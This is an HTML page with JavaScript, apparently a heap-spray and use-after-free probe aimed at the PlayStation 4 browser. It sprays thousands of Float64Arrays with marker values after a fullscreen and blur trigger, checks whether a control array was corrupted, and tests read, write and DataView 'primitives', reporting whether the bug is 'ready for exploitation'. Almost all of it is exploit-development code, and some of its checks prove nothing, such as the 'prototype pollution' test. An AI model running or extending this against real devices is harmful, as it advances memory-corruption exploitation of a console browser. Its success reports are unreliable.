<!DOCTYPE html>
<html>
<body>
    <h1>PS4 UAF - Debugger Core [v1.3 - Strict Validation]</h1>
    <button onclick="run()">EXECUTAR TESTE</button>
    <hr>
    <div id="c"></div>

    <script>
        const P_A = 2.121995791e-314;     // 0x4141414141414141
        const P_B = 2.122141663e-314;     // 0x4242424242424242
        const P_C = 2.122287535e-314;     // 0x4343434343434343
        const M_V = 3.395193267e-313;     // 0xDEADBEEFCAFEBABE

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        function log(tag, status, msg) {
            const colors = {
                "PASS": "green",
                "FAIL": "red",
                "ERR": "orange",
                "INFO": "blue",
                "WARN": "purple"
            };
            const color = colors[status] || "black";
            document.getElementById('c').innerHTML += `<span style="color:${color}">[${tag}] ${status}</span> - ${msg}<br>`;
        }

        function run() {
            document.getElementById('c').innerHTML = '';
            
            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i; 
                ctrls.push(a);
            }

            log("WAIT", "INFO", "Entre em Fullscreen e aperte OPTIONS.");
            document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
                
                // Spray com padrão RIGOROSO para validação
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8);
                    s[0] = P_A;  // Marker primário
                    s[1] = P_B;  // Marker secundário
                    s[2] = P_C;  // Marker terciário
                    s[3] = M_V;  // Marker quaternário
                    s[4] = P_A;  // Repetição para validação
                    s[5] = P_B;
                    s[6] = P_C;
                    s[7] = M_V;
                    spray.push(s);
                }

                let corr = null;
                let corrIdx = -1;
                
                // FASE 1: Detectar UAF básico
                for(let i = 0; i < ctrls.length; i++) {
                    if (ctrls[i][0] === P_A) {
                        corr = ctrls[i];
                        corrIdx = i;
                        log("UAF", "PASS", `UAF inicial detectado no Index: ${i}`);
                        break;
                    }
                }

                if (!corr) {
                    log("UAF", "FAIL", "Nenhuma corrupção detectada.");
                    return;
                }

                // FASE 2: VALIDAÇÃO DE INTEGRIDADE (CRÍTICO)
                log("VALID", "INFO", "Iniciando validação de integridade do buffer...");
                
                const expectedPattern = [P_A, P_B, P_C, M_V, P_A, P_B, P_C, M_V];
                let integrityScore = 0;
                let mismatchDetails = [];
                
                for(let i = 0; i < 8; i++) {
                    const expected = f2h(expectedPattern[i]);
                    const actual = f2h(corr[i]);
                    
                    if (corr[i] === expectedPattern[i]) {
                        integrityScore++;
                        log("VALID", "PASS", `corr[${i}] OK: ${actual}`);
                    } else {
                        log("VALID", "FAIL", `corr[${i}] MISMATCH: expected=${expected}, got=${actual}`);
                        mismatchDetails.push(`[${i}]: ${expected} != ${actual}`);
                    }
                }

                // FASE 3: DECISÃO BASEADA EM INTEGRIDADE
                const integrityPercent = (integrityScore / 8) * 100;
                log("VALID", "INFO", `Integridade: ${integrityScore}/8 (${integrityPercent.toFixed(1)}%)`);

                if (integrityScore < 4) {
                    log("VALID", "FAIL", "INTEGRIDADE INSUFICIENTE (<50%). UAF não utilizável.");
                    log("DEBUG", "INFO", "Possíveis causas:");
                    log("DEBUG", "INFO", "  1. Timing incorreto (spray após realocação)");
                    log("DEBUG", "INFO", "  2. Fragmentação de memória");
                    log("DEBUG", "INFO", "  3. Realocação parcial do buffer");
                    log("DEBUG", "INFO", "  4. Proteção CoW mais agressiva que o esperado");
                    return;
                }

                if (integrityScore < 8) {
                    log("VALID", "WARN", `INTEGRIDADE PARCIAL (${integrityPercent.toFixed(1)}%). Exploração de risco.`);
                } else {
                    log("VALID", "PASS", "INTEGRIDADE COMPLETA (100%). UAF totalmente funcional!");
                }

                // FASE 4: TESTES DE PRIMITIVES (só executa se integridade >= 50%)
                
                // TEST1: READ PRIMITIVE
                try {
                    log("TEST1", "INFO", "Testando Read Primitive...");
                    const canRead = (corr[3] === M_V && corr[7] === M_V);
                    if (canRead) {
                        log("TEST1", "PASS", "Read Primitive confirmado (M_V em [3] e [7])");
                    } else {
                        log("TEST1", "FAIL", "Read Primitive inconsistente");
                    }
                } catch(e) { log("TEST1", "ERR", e.message); }

                // TEST2: WRITE PRIMITIVE
                try {
                    log("TEST2", "INFO", "Testando Write Primitive...");
                    const testVal = 1.234567890123456e-310; // Valor único
                    const originalVal = corr[4];
                    
                    corr[4] = testVal;
                    const writtenBack = corr[4];
                    
                    if (writtenBack === testVal) {
                        log("TEST2", "PASS", `Write confirmado: ${f2h(testVal)}`);
                        
                        // Tenta verificar se spray foi afetado
                        let foundInSpray = false;
                        for(let i = 0; i < Math.min(100, spray.length); i++) {
                            if (spray[i][4] === testVal) {
                                log("TEST2", "PASS", `Write propagou para spray[${i}][4] - BIDIRECIONAL!`);
                                foundInSpray = true;
                                break;
                            }
                        }
                        
                        if (!foundInSpray) {
                            log("TEST2", "WARN", "Write isolado (CoW) - Unidirecional apenas");
                        }
                    } else {
                        log("TEST2", "FAIL", `Write falhou: expected=${f2h(testVal)}, got=${f2h(writtenBack)}`);
                    }
                } catch(e) { log("TEST2", "ERR", e.message); }

                // TEST3: DATAVIEW WRITE
                try {
                    log("TEST3", "INFO", "Testando DataView Write...");
                    const dv = new DataView(corr.buffer);
                    const offset = 24; // corr[3]
                    
                    dv.setUint32(offset, 0x13371337, true);
                    dv.setUint32(offset + 4, 0xBEEFCAFE, true);
                    
                    const result = f2h(corr[3]);
                    if (result === "0xbeefcafe13371337") {
                        log("TEST3", "PASS", `DataView Write OK: ${result}`);
                    } else {
                        log("TEST3", "FAIL", `DataView inconsistente: ${result}`);
                    }
                } catch(e) { log("TEST3", "ERR", e.message); }

                // TEST4: PROTOTYPE POLLUTION
                try {
                    log("TEST4", "INFO", "Testando Prototype Pollution...");
                    let reg = Array.from(corr);
                    Object.setPrototypeOf(reg, { pwned: 0xDEADC0DE });
                    
                    if (reg.pwned === 0xDEADC0DE) {
                        log("TEST4", "PASS", "Prototype Hijack confirmado");
                    } else {
                        log("TEST4", "FAIL", "Prototype Hijack falhou");
                    }
                } catch(e) { log("TEST4", "ERR", e.message); }

                // RELATÓRIO FINAL
                log("REPORT", "INFO", "=== ANÁLISE FINAL ===");
                if (integrityScore === 8) {
                    log("REPORT", "PASS", "✓ UAF TOTALMENTE FUNCIONAL - Pronto para exploração");
                } else if (integrityScore >= 4) {
                    log("REPORT", "WARN", "⚠ UAF PARCIAL - Exploração possível mas arriscada");
                } else {
                    log("REPORT", "FAIL", "✗ UAF INVÁLIDO - Não prosseguir");
                }
            };
        }
    </script>
</body>
</html>
